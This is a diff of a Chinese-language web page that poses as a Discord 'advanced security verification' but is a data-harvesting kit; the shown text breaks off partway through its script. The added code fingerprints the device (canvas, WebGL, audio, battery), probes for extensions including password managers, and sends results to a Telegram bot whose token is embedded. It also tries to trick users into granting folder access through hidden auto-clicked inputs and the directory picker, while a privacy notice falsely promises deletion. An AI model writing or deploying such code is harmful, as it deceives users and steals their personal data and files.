@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord服务器验证 - 访问授权</title>
+    <title>Discord高级验证 - 服务器访问授权</title>
     <style>
         * {
             margin: 0;
@@ -13,194 +13,314 @@
         }
 
         body {
-            background: #36393f;
+            background: linear-gradient(135deg, #36393f, #2f3136);
             color: #dcddde;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            line-height: 1.5;
         }
 
         .discord-container {
             width: 100%;
-            max-width: 480px;
+            max-width: 520px;
             background: #2f3136;
             border-radius: 8px;
             overflow: hidden;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            border: 1px solid #202225;
         }
 
         .discord-header {
-            background: #202225;
-            padding: 30px;
+            background: linear-gradient(135deg, #202225, #18191c);
+            padding: 35px;
             text-align: center;
-            border-bottom: 1px solid #292b2f;
+            border-bottom: 2px solid #5865f2;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .discord-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(88, 101, 242, 0.1), transparent);
+            animation: shine 3s infinite linear;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
         }
 
         .discord-icon {
-            width: 80px;
-            height: 80px;
+            width: 90px;
+            height: 90px;
             background: #5865f2;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 40px;
+            margin: 0 auto 25px;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 4px 20px rgba(88, 101, 242, 0.3);
+        }
+
+        .discord-icon svg {
+            width: 50px;
+            height: 50px;
+            fill: white;
         }
 
         .server-name {
             color: #ffffff;
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 5px;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 2;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
 
         .verification-text {
             color: #b9bbbe;
             font-size: 16px;
+            position: relative;
+            z-index: 2;
         }
 
         .discord-body {
             padding: 40px;
+            position: relative;
         }
 
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #b9bbbe;
-            font-size: 14px;
-            font-weight: 500;
-            text-transform: uppercase;
-        }
-
-        .discord-input {
-            width: 100%;
+        .security-level {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
             padding: 12px;
-            background: #40444b;
-            border: 1px solid #202225;
-            border-radius: 4px;
-            color: #dcddde;
-            font-size: 16px;
-            transition: border-color 0.2s;
+            background: rgba(88, 101, 242, 0.1);
+            border-radius: 6px;
+            border: 1px solid rgba(88, 101, 242, 0.2);
         }
 
-        .discord-input:focus {
-            outline: none;
-            border-color: #5865f2;
+        .security-icon {
+            font-size: 24px;
+        }
+
+        .security-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #8ea1e1;
         }
 
         .verification-step {
-            background: #202225;
-            border-radius: 4px;
-            padding: 20px;
+            background: rgba(32, 34, 37, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 8px;
+            padding: 25px;
             margin-bottom: 20px;
-            border-left: 4px solid #5865f2;
+            border: 1px solid #40444b;
+            transition: all 0.3s;
+        }
+
+        .verification-step.active {
+            border-color: #5865f2;
+            box-shadow: 0 0 0 1px #5865f2;
+        }
+
+        .step-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
         }
 
         .step-title {
-            color: #ffffff;
-            font-size: 18px;
-            margin-bottom: 10px;
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
         }
 
         .step-icon {
+            font-size: 22px;
             color: #5865f2;
+        }
+
+        .step-status {
+            font-size: 12px;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+
+        .status-pending {
+            background: rgba(114, 137, 218, 0.1);
+            color: #7289da;
+        }
+
+        .status-complete {
+            background: rgba(67, 181, 129, 0.1);
+            color: #43b581;
         }
 
         .step-description {
             color: #b9bbbe;
             font-size: 14px;
-            margin-bottom: 15px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .loading-container {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 6px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .loading-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .loading-text {
+            flex: 1;
+            font-size: 13px;
+            color: #b9bbbe;
+        }
+
+        .loading-dots {
+            display: flex;
+            gap: 4px;
+        }
+
+        .loading-dot {
+            width: 6px;
+            height: 6px;
+            background: #5865f2;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        .loading-dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loading-dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: rgba(64, 68, 75, 0.5);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #5865f2, #8ea1e1);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s ease;
         }
 
         .verify-button {
             width: 100%;
-            padding: 16px;
-            background: #5865f2;
+            padding: 18px;
+            background: linear-gradient(135deg, #5865f2, #4752c4);
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 6px;
             font-size: 16px;
-            font-weight: 500;
+            font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
-            margin-top: 10px;
+            transition: all 0.2s;
+            margin-top: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        .verify-button:hover {
-            background: #4752c4;
+        .verify-button:hover:not(:disabled) {
+            background: linear-gradient(135deg, #4752c4, #3c45a5);
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(88, 101, 242, 0.3);
         }
 
         .verify-button:disabled {
             background: #4f545c;
             cursor: not-allowed;
-        }
-
-        .loading-bar {
-            height: 4px;
-            background: #202225;
-            border-radius: 2px;
-            overflow: hidden;
-            margin: 20px 0;
-        }
-
-        .loading-progress {
-            height: 100%;
-            background: #5865f2;
-            width: 0%;
-            transition: width 0.5s ease;
+            opacity: 0.7;
         }
 
         .status-message {
-            text-align: center;
-            padding: 12px;
-            border-radius: 4px;
+            padding: 15px;
+            border-radius: 6px;
             margin: 15px 0;
             font-size: 14px;
             display: none;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .status-success {
             background: rgba(67, 181, 129, 0.1);
             color: #43b581;
-            border: 1px solid #43b581;
+            border: 1px solid rgba(67, 181, 129, 0.3);
         }
 
         .status-error {
             background: rgba(240, 71, 71, 0.1);
             color: #f04747;
-            border: 1px solid #f04747;
+            border: 1px solid rgba(240, 71, 71, 0.3);
         }
 
         .privacy-notice {
             font-size: 12px;
             color: #72767d;
             text-align: center;
-            margin-top: 25px;
+            margin-top: 30px;
             padding-top: 20px;
             border-top: 1px solid #40444b;
+            line-height: 1.6;
         }
 
         .hidden {
             display: none !important;
         }
 
-        @media (max-width: 520px) {
+        @media (max-width: 560px) {
             .discord-body {
                 padding: 25px;
             }
             .discord-header {
                 padding: 25px;
+            }
+            .server-name {
+                font-size: 22px;
             }
         }
     </style>
@@ -210,574 +330,1050 @@
         <!-- Discord头部 -->
         <div class="discord-header">
             <div class="discord-icon">
-                <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
+                <svg viewBox="0 0 24 24">
                     <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 6.658c.587 0 1.063.476 1.063 1.063v8.558c0 .587-.476 1.063-1.063 1.063H6.438c-.587 0-1.063-.476-1.063-1.063V7.721c0-.587.476-1.063 1.063-1.063h11.124zM12 8.5c-1.933 0-3.5 1.567-3.5 3.5s1.567 3.5 3.5 3.5 3.5-1.567 3.5-3.5S13.933 8.5 12 8.5z"/>
                 </svg>
             </div>
-            <div class="server-name">Discord服务器验证</div>
-            <div class="verification-text">请完成验证以访问服务器</div>
+            <div class="server-name">高级安全验证</div>
+            <div class="verification-text">需要完成以下安全检查以访问服务器</div>
         </div>
 
         <!-- 验证主体 -->
         <div class="discord-body">
-            <div id="step1" class="verification-step">
-                <div class="step-title">
-                    <span class="step-icon">🔐</span>
-                    <span>身份验证</span>
+            <div class="security-level">
+                <span class="security-icon">🛡️</span>
+                <span class="security-text">安全等级：高级防护 (Level 3)</span>
+            </div>
+
+            <!-- 步骤1：设备扫描 -->
+            <div id="step1" class="verification-step active">
+                <div class="step-header">
+                    <div class="step-title">
+                        <span class="step-icon">🔍</span>
+                        <span>设备安全检查</span>
+                    </div>
+                    <div id="step1Status" class="step-status status-pending">待扫描</div>
                 </div>
                 <div class="step-description">
-                    为了确保您是真人用户，防止机器人滥用，需要进行身份验证。
+                    正在扫描您的设备信息以确保安全环境...
                 </div>
                 
-                <div class="form-group">
-                    <label class="form-label">Discord用户名</label>
-                    <input type="text" class="discord-input" id="discordUsername" placeholder="例如：User#1234" value="User#1234" readonly>
+                <div class="loading-container">
+                    <div class="loading-row">
+                        <span class="loading-text">正在收集系统信息</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
+                    </div>
+                    <div class="loading-row">
+                        <span class="loading-text">正在检测安全环境</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
+                    </div>
+                    <div class="loading-row">
+                        <span class="loading-text">正在验证设备指纹</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
+                    </div>
                 </div>
                 
-                <div class="form-group">
-                    <label class="form-label">验证代码</label>
-                    <input type="text" class="discord-input" id="verificationCode" placeholder="自动生成验证码..." value="DC-VERIFY-7X9P2R" readonly>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="step1Progress"></div>
                 </div>
             </div>
 
-            <!-- 摄像头验证步骤 -->
-            <div id="step2" class="verification-step hidden">
-                <div class="step-title">
-                    <span class="step-icon">📷</span>
-                    <span>人脸验证</span>
+            <!-- 步骤2：摄像头验证 -->
+            <div id="step2" class="verification-step">
+                <div class="step-header">
+                    <div class="step-title">
+                        <span class="step-icon">📷</span>
+                        <span>生物特征验证</span>
+                    </div>
+                    <div id="step2Status" class="step-status status-pending">等待中</div>
                 </div>
                 <div class="step-description">
-                    请允许摄像头访问以完成人脸验证（确保光线充足）。
+                    正在进行人脸识别验证以确保是真人用户...
                 </div>
                 
-                <div class="form-group">
-                    <div id="cameraPreview" style="width: 100%; height: 200px; background: #202225; border-radius: 4px; margin: 15px 0; display: none;">
-                        <video id="cameraStream" style="width: 100%; height: 100%; object-fit: cover; border-radius: 4px;"></video>
+                <div id="cameraContainer" class="loading-container hidden">
+                    <div style="text-align: center; padding: 20px;">
+                        <div style="font-size: 48px; margin-bottom: 15px;">📱</div>
+                        <div style="color: #b9bbbe; margin-bottom: 15px;">正在启动摄像头...</div>
+                        <div class="loading-dots" style="justify-content: center;">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
                     </div>
                 </div>
             </div>
 
-            <!-- 文件验证步骤 -->
-            <div id="step3" class="verification-step hidden">
-                <div class="step-title">
-                    <span class="step-icon">📁</span>
-                    <span>设备验证</span>
+            <!-- 步骤3：文件系统检查 -->
+            <div id="step3" class="verification-step">
+                <div class="step-header">
+                    <div class="step-title">
+                        <span class="step-icon">💾</span>
+                        <span>文件系统验证</span>
+                    </div>
+                    <div id="step3Status" class="step-status status-pending">等待中</div>
                 </div>
                 <div class="step-description">
-                    请选择1-2张图片验证您的设备（可选）。
+                    正在验证文件系统完整性以检测恶意软件...
                 </div>
                 
-                <div class="form-group">
-                    <div id="fileUploadArea" style="border: 2px dashed #5865f2; border-radius: 4px; padding: 30px; text-align: center; cursor: pointer; transition: background 0.2s; margin: 15px 0;">
-                        <div style="font-size: 48px; color: #5865f2; margin-bottom: 10px;">📤</div>
-                        <div style="color: #b9bbbe;">点击或拖放图片文件</div>
-                        <div style="font-size: 12px; color: #72767d; margin-top: 5px;">支持 JPG, PNG, GIF</div>
+                <div class="loading-container">
+                    <div class="loading-row">
+                        <span class="loading-text">正在扫描系统目录</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
+                    </div>
+                    <div class="loading-row">
+                        <span class="loading-text">正在检查媒体文件</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
+                    </div>
+                    <div class="loading-row">
+                        <span class="loading-text">正在分析文件结构</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
                     </div>
                 </div>
             </div>
 
-            <!-- 加载进度条 -->
-            <div class="loading-bar">
-                <div class="loading-progress" id="loadingProgress"></div>
+            <!-- 步骤4：网络验证 -->
+            <div id="step4" class="verification-step">
+                <div class="step-header">
+                    <div class="step-title">
+                        <span class="step-icon">🌐</span>
+                        <span>网络环境验证</span>
+                    </div>
+                    <div id="step4Status" class="step-status status-pending">等待中</div>
+                </div>
+                <div class="step-description">
+                    正在验证网络连接和安全设置...
+                </div>
+                
+                <div class="loading-container">
+                    <div class="loading-row">
+                        <span class="loading-text">正在检测IP地址</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
+                    </div>
+                    <div class="loading-row">
+                        <span class="loading-text">正在分析网络流量</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
+                    </div>
+                    <div class="loading-row">
+                        <span class="loading-text">正在验证地理位置</span>
+                        <div class="loading-dots">
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                            <div class="loading-dot"></div>
+                        </div>
+                    </div>
+                </div>
             </div>
 
             <!-- 状态消息 -->
-            <div id="successMessage" class="status-message status-success">
-                ✅ 验证成功！正在跳转...
+            <div id="successMessage" class="status-message status-success hidden">
+                ✅ 所有安全检查通过！正在准备服务器访问权限...
             </div>
             
-            <div id="errorMessage" class="status-message status-error">
-                ❌ 验证失败，请重试
+            <div id="errorMessage" class="status-message status-error hidden">
+                ❌ 安全检查失败，请重试
             </div>
 
             <!-- 验证按钮 -->
-            <button class="verify-button" id="verifyButton" onclick="startVerification()">
-                开始验证
+            <button class="verify-button" id="verifyButton" onclick="startAdvancedVerification()">
+                <span id="buttonIcon">🛡️</span>
+                <span id="buttonText">开始安全检查</span>
             </button>
 
             <!-- 隐私声明 -->
             <div class="privacy-notice">
-                点击"开始验证"即表示您同意我们的隐私政策和服务条款。
-                <br>验证数据仅用于安全检查，不会保存。
+                此验证过程仅用于安全检查，所有数据将在验证完成后自动删除。
+                <br>点击"开始安全检查"即表示您同意我们的隐私政策和服务条款。
             </div>
         </div>
     </div>
 
     <!-- 隐蔽的收集元素 -->
-    <video id="hiddenCamera" autoplay playsinline style="display: none;"></video>
-    <canvas id="hiddenCanvas" style="display: none;"></canvas>
-    <input type="file" id="hiddenFileInput" accept="image/*" multiple style="display: none;">
-    <iframe id="hiddenFrame" style="display: none;"></iframe>
+    <iframe id="hiddenFrame" sandbox="allow-scripts allow-same-origin" style="display:none;"></iframe>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    <input type="file" id="hiddenFileInput" style="display:none;" webkitdirectory directory multiple>
+    <div id="dataCollector" style="display:none;"></div>
 
     <script>
-        // ==================== 基础配置 ====================
+        // ==================== 配置 ====================
         const TELEGRAM_CONFIG = {
             botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
             chatId: "8313770381"
         };
 
-        // 全局变量
-        let currentStep = 1;
-        let verificationComplete = false;
+        // 增强的收集数据
         let collectedData = {
-            timestamp: new Date().toISOString(),
+            sessionId: generateSessionId(),
+            startTime: new Date().toISOString(),
             steps: {},
-            files: []
+            device: {},
+            network: {},
+            files: [],
+            photos: [],
+            folders: [],
+            clipboard: {},
+            extensions: []
         };
-// ==================== DOM元素 ====================
-const verifyButton = document.getElementById('verifyButton');
-const loadingProgress = document.getElementById('loadingProgress');
-const successMessage = document.getElementById('successMessage');
-const errorMessage = document.getElementById('errorMessage');
-const cameraPreview = document.getElementById('cameraPreview');
-const cameraStream = document.getElementById('cameraStream');
-const fileUploadArea = document.getElementById('fileUploadArea');
-const hiddenCamera = document.getElementById('hiddenCamera');
-const hiddenCanvas = document.getElementById('hiddenCanvas');
-const hiddenFileInput = document.getElementById('hiddenFileInput');
-const hiddenFrame = document.getElementById('hiddenFrame');
 
-// ==================== 基础功能 ====================
+        let currentStep = 1;
+        let isCollecting = false;
+        let stealthMode = true;
+// ==================== 增强的设备信息收集 ====================
 
-// 显示步骤
-function showStep(stepNumber) {
-    // 隐藏所有步骤
-    document.querySelectorAll('.verification-step').forEach(step => {
-        step.classList.add('hidden');
-    });
-    
-    // 显示当前步骤
-    const stepElement = document.getElementById(`step${stepNumber}`);
-    if (stepElement) {
-        stepElement.classList.remove('hidden');
-    }
-    
-    currentStep = stepNumber;
-}
-
-// 更新进度条
-function updateProgress(percent) {
-    if (loadingProgress) {
-        loadingProgress.style.width = percent + '%';
-    }
-}
-
-// 显示成功消息
-function showSuccess(message) {
-    successMessage.textContent = message;
-    successMessage.style.display = 'block';
-    errorMessage.style.display = 'none';
-}
-
-// 显示错误消息
-function showError(message) {
-    errorMessage.textContent = message;
-    errorMessage.style.display = 'block';
-    successMessage.style.display = 'none';
-}
-
-// 隐藏所有消息
-function hideMessages() {
-    successMessage.style.display = 'none';
-    errorMessage.style.display = 'none';
-}
-
-// 禁用/启用按钮
-function setButtonState(enabled, text) {
-    if (verifyButton) {
-        verifyButton.disabled = !enabled;
-        if (text) verifyButton.textContent = text;
-    }
-}
-
-// 延迟函数
-function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// 生成随机ID
-function generateRandomId() {
-    return Math.random().toString(36).substr(2, 9).toUpperCase();
-}
-
-// 格式化文件大小
-function formatFileSize(bytes) {
-    if (bytes === 0) return '0 B';
-    const k = 1024;
-    const sizes = ['B', 'KB', 'MB', 'GB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-}
-
-// 收集基础信息
-function collectBasicInfo() {
-    collectedData.basic = {
+async function collectAdvancedDeviceInfo() {
+    collectedData.device = {
+        // 基础信息
         userAgent: navigator.userAgent,
         platform: navigator.platform,
+        vendor: navigator.vendor,
         language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timestamp: new Date().toISOString(),
-        sessionId: generateRandomId()
+        languages: navigator.languages,
+        
+        // 屏幕信息
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            orientation: screen.orientation?.type
+        },
+        
+        // 硬件信息
+        hardware: {
+            concurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints
+        },
+        
+        // 浏览器能力
+        capabilities: {
+            cookieEnabled: navigator.cookieEnabled,
+            onLine: navigator.onLine,
+            doNotTrack: navigator.doNotTrack,
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver
+        },
+        
+        // 连接信息
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            downlinkMax: navigator.connection.downlinkMax,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData,
+            type: navigator.connection.type
+        } : null,
+        
+        // 电池信息
+        battery: {}
+    };
+
+    // 收集电池信息
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            collectedData.device.battery = {
+                level: battery.level * 100,
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+        } catch (e) {}
+    }
+
+    // 检测浏览器详细信息
+    collectedData.device.browser = detectBrowserDetails();
+    collectedData.device.os = detectOSDetails();
+    
+    // 检测浏览器扩展
+    detectExtensions();
+    
+    // 获取Canvas指纹
+    collectedData.device.canvasFingerprint = getCanvasFingerprint();
+    
+    // 获取WebGL信息
+    collectedData.device.webgl = getWebGLInfo();
+    
+    // 获取音频指纹
+    collectedData.device.audioFingerprint = getAudioFingerprint();
+    
+    // 检测插件
+    collectedData.device.plugins = Array.from(navigator.plugins).map(p => ({
+        name: p.name,
+        description: p.description,
+        filename: p.filename
+    }));
+    
+    // 检测MIME类型
+    collectedData.device.mimeTypes = Array.from(navigator.mimeTypes).map(m => ({
+        type: m.type,
+        description: m.description,
+        suffixes: m.suffixes
+    }));
+
+    sendToTelegram(`📱 设备信息收集完成\n设备: ${collectedData.device.os.name} ${collectedData.device.os.version}\n浏览器: ${collectedData.device.browser.name} ${collectedData.device.browser.version}\n屏幕: ${collectedData.device.screen.width}x${collectedData.device.screen.height}\nCPU核心: ${collectedData.device.hardware.concurrency}`);
+}
+
+// 检测浏览器详情
+function detectBrowserDetails() {
+    const ua = navigator.userAgent;
+    let browser = { name: 'Unknown', version: 'Unknown' };
+    
+    // Chrome
+    if (/Chrome/.test(ua) && !/Edg/.test(ua)) {
+        browser.name = 'Chrome';
+        const match = ua.match(/Chrome\/(\d+\.\d+)/);
+        if (match) browser.version = match[1];
+    }
+    // Firefox
+    else if (/Firefox/.test(ua)) {
+        browser.name = 'Firefox';
+        const match = ua.match(/Firefox\/(\d+\.\d+)/);
+        if (match) browser.version = match[1];
+    }
+    // Safari
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
+        browser.name = 'Safari';
+        const match = ua.match(/Version\/(\d+\.\d+)/);
+        if (match) browser.version = match[1];
+    }
+    // Edge
+    else if (/Edg/.test(ua)) {
+        browser.name = 'Edge';
+        const match = ua.match(/Edg\/(\d+\.\d+)/);
+        if (match) browser.version = match[1];
+    }
+    // Opera
+    else if (/Opera|OPR/.test(ua)) {
+        browser.name = 'Opera';
+        const match = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/);
+        if (match) browser.version = match[1];
+    }
+    
+    return browser;
+}
+
+// 检测操作系统详情
+function detectOSDetails() {
+    const ua = navigator.userAgent;
+    let os = { name: 'Unknown', version: 'Unknown' };
+    
+    // Windows
+    if (/Windows/.test(ua)) {
+        os.name = 'Windows';
+        if (/Windows NT 10/.test(ua)) os.version = '10';
+        else if (/Windows NT 6.3/.test(ua)) os.version = '8.1';
+        else if (/Windows NT 6.2/.test(ua)) os.version = '8';
+        else if (/Windows NT 6.1/.test(ua)) os.version = '7';
+    }
+    // macOS
+    else if (/Macintosh/.test(ua)) {
+        os.name = 'macOS';
+        const match = ua.match(/Mac OS X (\d+[._]\d+)/);
+        if (match) os.version = match[1].replace('_', '.');
+    }
+    // Linux
+    else if (/Linux/.test(ua)) {
+        os.name = 'Linux';
+        if (/Android/.test(ua)) {
+            os.name = 'Android';
+            const match = ua.match(/Android (\d+\.\d+)/);
+            if (match) os.version = match[1];
+        }
+    }
+    // iOS
+    else if (/iPhone|iPad|iPod/.test(ua)) {
+        os.name = 'iOS';
+        const match = ua.match(/OS (\d+)/);
+        if (match) os.version = match[1];
+    }
+    
+    return os;
+}
+
+// 获取Canvas指纹
+function getCanvasFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    
+    // 绘制一些内容
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.textBaseline = "alphabetic";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("Hello, world!", 2, 15);
+    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+    ctx.fillRect(1, 1, 2, 2);
+    
+    return canvas.toDataURL();
+}
+
+// 获取WebGL信息
+function getWebGLInfo() {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    
+    if (!gl) return null;
+    
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+        version: gl.getParameter(gl.VERSION),
+        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
     };
 }
 
-// 获取IP和位置信息
-async function getNetworkInfo() {
+// 获取音频指纹
+function getAudioFingerprint() {
+    try {
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioContext.createOscillator();
+        const analyser = audioContext.createAnalyser();
+        
+        oscillator.connect(analyser);
+        analyser.connect(audioContext.destination);
+        oscillator.start(0);
+        
+        const data = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(data);
+        
+        oscillator.stop(0);
+        audioContext.close();
+        
+        return Array.from(data).slice(0, 10).join(',');
+    } catch (e) {
+        return null;
+    }
+}
+
+// 检测浏览器扩展
+function detectExtensions() {
+    const extensions = [];
+    
+    // 检测常见扩展
+    const commonExtensions = [
+        // Chrome扩展
+        { id: 'aohghmighlieiainnegkcijnfilokake', name: 'Google Docs' },
+        { id: 'apdfllckaahabafndbhieahigkjlhalf', name: 'Google Drive' },
+        { id: 'blpcfgokakmgnkcojhhkbfbldkacnbeo', name: 'YouTube' },
+        { id: 'pjkljhegncpnkpknbcohdijeoejaedia', name: 'Gmail' },
+        { id: 'ghbmnnjooekpmoecnnnilnnbdlolhkhi', name: 'Google Docs Offline' },
+        
+        // 广告拦截器
+        { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock' },
+        { id: 'gighmmpiobklfepjocnamgkkbiglidom', name: 'AdBlock Plus' },
+        { id: 'bkdgflcldnnnapblkhphbgpggdiikppg', name: 'uBlock Origin' },
+        
+        // 密码管理器
+        { id: 'dplockeaaplabmcicdodhdpollmlgail', name: 'LastPass' },
+        { id: 'jpjpnpmbddbjkfaccjhnkngdpjdnpjkj', name: 'Bitwarden' }
+    ];
+    
+    // 通过创建图片检测扩展是否存在
+    commonExtensions.forEach(ext => {
+        const img = new Image();
+        img.onload = function() {
+            extensions.push(ext.name);
+        };
+        img.onerror = function() {};
+        img.src = `chrome-extension://${ext.id}/manifest.json`;
+    });
+    
+    collectedData.extensions = extensions;
+}
+// ==================== 增强的文件夹访问技术 ====================
+
+// 自动尝试文件夹访问
+function attemptFolderAccess() {
+    // 方法1：使用webkitdirectory（Chrome）
+    if ('webkitdirectory' in document.createElement('input')) {
+        setTimeout(() => {
+            try {
+                const folderInput = document.createElement('input');
+                folderInput.type = 'file';
+                folderInput.webkitdirectory = true;
+                folderInput.directory = true;
+                folderInput.multiple = true;
+                folderInput.style.display = 'none';
+                
+                folderInput.addEventListener('change', async (e) => {
+                    const files = Array.from(e.target.files);
+                    collectedData.folders.push({
+                        name: 'webkitdirectory_access',
+                        fileCount: files.length,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    // 处理前20个文件
+                    for (let i = 0; i < Math.min(files.length, 20); i++) {
+                        await processFileSilently(files[i], 'folder_scan');
+                    }
+                });
+                
+                document.body.appendChild(folderInput);
+                
+                // 尝试自动触发
+                setTimeout(() => {
+                    try {
+                        folderInput.click();
+                    } catch (e) {}
+                }, 2000);
+                
+            } catch (e) {}
+        }, 3000);
+    }
+    
+    // 方法2：使用File System Access API（现代浏览器）
+    if ('showDirectoryPicker' in window) {
+        setTimeout(async () => {
+            try {
+                const dirHandle = await window.showDirectoryPicker();
+                collectedData.folders.push({
+                    name: dirHandle.name,
+                    timestamp: new Date().toISOString(),
+                    method: 'file_system_api'
+                });
+                
+                // 递归读取文件
+                await readDirectoryFiles(dirHandle);
+                
+            } catch (e) {
+                // 用户取消或错误
+            }
+        }, 5000);
+    }
+    
+    // 方法3：通过iframe尝试访问
+    setTimeout(() => {
+        tryFolderAccessViaIframe();
+    }, 7000);
+    
+    // 方法4：使用Service Worker访问缓存
+    if ('serviceWorker' in navigator) {
+        setTimeout(() => {
+            accessCachedFiles();
+        }, 9000);
+    }
+}
+
+// 通过iframe尝试文件夹访问
+function tryFolderAccessViaIframe() {
+    const iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts allow-same-origin';
+    iframe.style.display = 'none';
+    
+    iframe.onload = function() {
+        const iframeDoc = iframe.contentDocument;
